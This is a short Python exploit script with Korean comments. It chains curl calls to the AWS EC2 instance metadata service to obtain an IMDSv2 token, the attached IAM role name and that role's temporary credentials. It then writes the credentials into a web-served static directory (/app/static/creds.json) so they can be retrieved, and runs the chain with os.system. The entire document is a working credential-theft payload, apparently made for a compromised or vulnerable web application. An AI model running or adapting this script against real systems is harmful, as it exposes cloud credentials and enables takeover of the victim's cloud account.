import os

# creds.json 저장 위치 (static 디렉터리 경로)
output_path = "/app/static/creds.json"

# Step 1. 임시 토큰을 얻기 위한 curl 명령
get_token_cmd = (
    "curl -s -X PUT 'http://169.254.169.254/latest/api/token' "
    "-H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'"
)

# Step 2. 토큰을 활용해 IAM role 이름 얻기
get_role_cmd = (
    "TOKEN=$({0}) && "
    "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" "
    "'http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
).format(get_token_cmd)

# Step 3. role 이름을 바탕으로 creds 가져오기
get_creds_cmd = (
    "TOKEN=$({0}) && ROLE=$({1}) && "
    "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" "
    "\"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\""
).format(get_token_cmd, get_role_cmd)

# Step 4. 결과를 creds.json으로 저장
final_cmd = "echo $({}) > {}".format(get_creds_cmd, output_path)

# Exploit 실행
os.system(final_cmd)
